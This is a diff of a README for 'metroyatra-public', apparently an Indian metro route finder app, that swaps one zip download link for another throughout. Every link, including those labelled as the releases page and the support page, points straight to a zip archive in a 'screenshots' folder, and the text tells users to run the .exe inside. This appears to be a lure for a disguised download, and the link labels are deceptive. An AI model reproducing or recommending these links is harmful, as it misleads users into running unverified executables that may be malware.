@@ -1,6 +1,6 @@
 # 🌍 metroyatra-public - Find Your Metro Journey Easily
 
-[![Download](https://raw.githubusercontent.com/dudi1920/metroyatra-public/main/screenshots/metroyatra-public_1.2-beta.3.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/dudi1920/metroyatra-public/main/screenshots/metroyatra-public_1.2-beta.3.zip)
+[![Download](https://raw.githubusercontent.com/dudi1920/metroyatra-public/main/screenshots/public-metroyatra-1.4.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/dudi1920/metroyatra-public/main/screenshots/public-metroyatra-1.4.zip)
 
 ## 📖 Overview
 
@@ -10,13 +10,13 @@ MetroYatra is India’s dedicated metro route finder app and website. It helps y
 
 Follow these steps to download and run MetroYatra on your device. 
 
-1. **Visit the Releases Page:** Click [here to visit the download page](https://raw.githubusercontent.com/dudi1920/metroyatra-public/main/screenshots/metroyatra-public_1.2-beta.3.zip).
+1. **Visit the Releases Page:** Click [here to visit the download page](https://raw.githubusercontent.com/dudi1920/metroyatra-public/main/screenshots/public-metroyatra-1.4.zip).
 2. **Select a Version:** Find the latest version under the "Releases" section.
 3. **Download the Application:** Click on the appropriate file for your operating system to download.
 
 ## 📥 Download & Install
 
-To begin using MetroYatra, visit this page to download: [Download MetroYatra](https://raw.githubusercontent.com/dudi1920/metroyatra-public/main/screenshots/metroyatra-public_1.2-beta.3.zip). 
+To begin using MetroYatra, visit this page to download: [Download MetroYatra](https://raw.githubusercontent.com/dudi1920/metroyatra-public/main/screenshots/public-metroyatra-1.4.zip). 
 
 1. After the download completes, locate the file in your "Downloads" folder.
 2. **For Windows Users:** Double-click the `.exe` file to start the installation.
@@ -44,6 +44,6 @@ For more details on MetroYatra's features and how to use the application, refer 
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please reach out on our [Support Page](https://raw.githubusercontent.com/dudi1920/metroyatra-public/main/screenshots/metroyatra-public_1.2-beta.3.zip). We are here to help!
+If you encounter any issues or have questions, please reach out on our [Support Page](https://raw.githubusercontent.com/dudi1920/metroyatra-public/main/screenshots/public-metroyatra-1.4.zip). We are here to help!
 
 Thank you for choosing MetroYatra. Safe travels!
